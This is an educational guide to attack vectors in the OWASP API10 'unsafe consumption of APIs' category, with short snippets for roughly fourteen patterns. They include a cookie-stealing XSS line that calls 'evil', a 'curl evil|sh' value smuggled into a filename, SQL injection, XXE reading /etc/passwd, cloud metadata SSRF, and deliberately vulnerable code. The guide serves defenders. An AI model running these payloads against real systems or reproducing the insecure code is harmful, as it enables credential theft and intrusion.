# API10: Unsafe Consumption of APIs - Attack Vectors

## Table of Contents
- [Understanding the Attack Surface](#understanding-the-attack-surface)
- [Core Attack Flow](#core-attack-flow)
- [Attack Patterns](#attack-patterns)
- [Chaining and Bypasses](#chaining-and-bypasses)

## Understanding the Attack Surface

> **⚠️ EDUCATIONAL PURPOSE ONLY** — these techniques are for defenders learning to secure their integrations.

Unsafe consumption is exploited by controlling, corrupting, or impersonating a service that the victim application *consumes and trusts*. The attacker does not need to breach your API directly. They need one of three footholds:

- **Compromise the upstream** — breach the partner, poison a package, or subvert the vendor's infrastructure.
- **Sit in the middle** — MITM a weakly-secured integration (plain HTTP, disabled TLS verification, no pinning).
- **Impersonate the upstream** — forge webhooks, spoof redirects, or register an attacker-controlled callback.

Once any foothold exists, the response body becomes an injection channel that arrives *pre-trusted* at your most dangerous sinks.

### Core Attack Flow

```
1. Map the integrations
   ↓
2. Gain influence over a response (compromise / MITM / forge / redirect)
   ↓
3. Craft a payload for the eventual sink (SQL, HTML/JS, XML, object, URL, huge body)
   ↓
4. Deliver via the trusted channel (app consumes without validation)
   ↓
5. Sink fires → injection / XSS / XXE / RCE / SSRF / DoS → escalate & pivot
```

## Attack Patterns

### 1. SQL Injection via Upstream Data
```
// Compromised CRM response
{ "users": [ { "name": "Robert'); DROP TABLE users;--", "email": "x@x.com" } ] }

// Vulnerable consumer
db.query(`INSERT INTO users(name,email) VALUES('${u.name}','${u.email}')`);
```
**Impact**: data destruction, exfiltration, auth bypass — all through a "trusted" feed.

### 2. Stored/Reflected XSS from Third-Party Text
```
{ "description": "<script>fetch('//evil/c?'+document.cookie)</script>" }
res.send(`<div>Today: ${weather.description}</div>`);  // XSS executes
```
**Impact**: session theft, account takeover, admin-panel compromise.

### 3. Insecure Deserialization of Partner Payloads
```python
# VULNERABLE - pickle from a partner endpoint
data = requests.get('https://partner/feed.pickle').content
obj = pickle.loads(data)     # RCE if partner/MITM controls the bytes
```
**Impact**: full RCE on the consuming host. Use JSON with a strict schema instead.

### 4. XXE via Third-Party XML
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<order>&xxe;</order>
```
```python
# VULNERABLE - default parser resolves entities
tree = etree.fromstring(partner_xml)
```
**Impact**: local file disclosure, SSRF, DoS (billion-laughs).

### 5. Following Redirects to Internal Targets (Consumption → SSRF)
```
Partner responds: 302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
requests.get(partner_url)     # allow_redirects=True by default → cloud creds leaked
```
**Impact**: cloud metadata/credential theft, internal service access.

### 6. TLS Not Enforced → Man-in-the-Middle Injection
```javascript
// VULNERABLE - verification disabled "to fix cert errors"
const agent = new https.Agent({ rejectUnauthorized: false });
axios.get('https://partner/data', { httpsAgent: agent });
```
**Impact**: attacker fully controls "trusted" responses without breaching the partner.

### 7. Forged Webhooks (Unverified Signatures)
```
POST /webhooks/payment
{ "event": "payment.succeeded", "order_id": 1001, "amount": 0 }
```
```python
# VULNERABLE - no HMAC check
if e['event'] == 'payment.succeeded':
    fulfill(e['order_id'])   # attacker gets free goods
```
**Impact**: fraud, unauthorized state changes, business-logic bypass.

### 8. Forged "Success" Responses (Business-Logic Bypass)
```python
resp = requests.post('https://pay/charge', json=order)   # MITM-able
if resp.json()['status'] == 'success':
    grant_premium(order['user_id'])   # forged flag → free premium
```
**Impact**: revenue loss, privilege escalation. Confirm via signed receipts.

### 9. IdP Claim Injection (name/email used unsanitized)
```
{ "email": "a@b.com", "name": "<img src=x onerror=alert(1)>" }
render(`Welcome ${claims.name}`);              // XSS
if (claims.email.endsWith('@corp.com')) grantAdmin();  // spoofable
```
**Impact**: XSS, authorization bypass via forged/loose claims.

### 10. Oversized / Slow Responses → Denial of Service
```python
# VULNERABLE - no timeout, no size cap
data = requests.get(partner_url).json()   # loads entire body into memory
```
**Impact**: memory exhaustion, thread/connection starvation, cascading outage.

### 11. Malformed / Unexpected Schema → Crash or Field Overwrite
```python
# Upstream sends {"role":"admin", ...} unexpectedly
user.update(**partner_response)   # role silently overwritten
```
**Impact**: privilege escalation, corrupted records, unhandled-exception DoS.

### 12. Command / Template Injection from Upstream Fields
```python
os.system(f"convert /tmp/{partner['filename']} out.png")
# filename = "a.jpg; curl evil|sh"  → command injection
```
**Impact**: RCE, SSTI. Never interpolate upstream data into shells or templates.

### 13. Poisoned Cached / Aggregated Content
```python
cache.set('headlines', requests.get(news_api).json())  # one bad response poisons all
```
**Impact**: mass stored XSS / content injection with a single upstream compromise.

### 14. Attacker-Controlled Callback / Endpoint URLs
```
POST /integrations/connect
{ "api_base": "http://attacker.example/v1" }   # all future calls go to attacker
```
**Impact**: full response control, SSRF, exfiltration. Allowlist integration hosts.

## Chaining and Bypasses

**Redirect + SSRF + Metadata**
```
Compromised partner → 302 → 169.254.169.254 → app follows → cloud creds leaked
```

**MITM + Deserialization**
```
Weak TLS → attacker rewrites body → serialized gadget chain → deserialize() → RCE
```

**Compromised Partner + Stored XSS in Admin Panel**
```
Poisoned feed field → stored verbatim → admin dashboard renders it → XSS in admin session
```

### Why Simple Defenses Fail
- **"We trust the partner"** — trust is not integrity; partners get breached.
- **"HTTPS is on"** — useless if verification is disabled or the upstream is malicious.
- **"We check status codes"** — codes and flags are unauthenticated and forgeable.
- **"It's just JSON"** — JSON still injects into SQL, HTML, and object graphs.

## Key Takeaways

1. **Upstream responses are untrusted input** — every field is attacker-reachable.
2. **Injection sinks don't care about data origin**.
3. **Transport weaknesses enable MITM** — enforce TLS verification and consider pinning.
4. **Redirects and callbacks turn consumption into SSRF**.
5. **Success flags must be cryptographically verified**.
6. **DoS is a first-class risk** from oversized/slow responses.
7. **One compromised partner scales to all its customers**.

## Next Steps

- **[Prevention Guide](prevention.md)**: Layered defenses for consuming APIs safely
- **[Code Examples](examples.md)**: Vulnerable vs. secure across four stacks
- **[Hands-On Lab](lab/api10-unsafe-consumption-lab/)**: Practice exploiting and fixing unsafe consumption
